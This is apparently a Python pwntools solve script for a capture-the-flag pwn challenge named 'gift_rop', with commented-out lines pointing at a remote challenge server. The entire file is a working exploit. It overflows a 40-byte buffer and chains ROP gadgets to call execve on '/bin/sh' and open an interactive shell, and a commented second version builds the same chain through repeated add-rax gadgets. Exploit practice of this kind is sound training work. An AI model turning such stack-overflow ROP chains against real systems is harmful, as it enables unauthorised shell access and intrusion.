from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'
r = process('./gift_rop')
# r = remote('101.32.220.189', 32297)

r.recvuntil(b"This is a fake(real) checkin problem.\n")

ret = 0x40101a
pop_rax = 0x448077
pop_rdi = 0x401f2f
pop_rsi = 0x409f9e
pop_rdx_rbx = 0x47f20b
sh_addr = 0x4c50f0
syscall = 0x401ce4

payload = b'a'*40+flat(ret, pop_rax, 0x3b, pop_rdi, sh_addr, pop_rsi, 0, pop_rdx_rbx, 0, 0, syscall)
pause()
r.send(payload)

r.interactive()

# from pwn import*
# # r = remote("101.32.220.189", 31902)
# r = process("./gift_rop")
# pop_rdi = 0x0000000000401f2f
# binsh = 0x4c50f0
# pop_rsi = 0x0000000000409f9e
# pop_rdx_pop_rbx = 0x000000000047f20b
# syscall = 0x0000000000401ce4
# add_rax_2 = 0x0000000000471267
# add_rax_1 = 0x0000000000471270
# ret = 0x000000000040101a
# p = b'a' * (0x20 + 0x8)
# p += p64(ret)
# p += p64(pop_rdi)
# p += p64(binsh)
# p += p64(pop_rsi)
# p += p64(0)
# p += p64(pop_rdx_pop_rbx)
# p += p64(0) * 2
# p += p64(add_rax_2) * 29
# p += p64(add_rax_1)
# p += p64(syscall)

# print(len(p))
# r.send(p)
# r.interactive()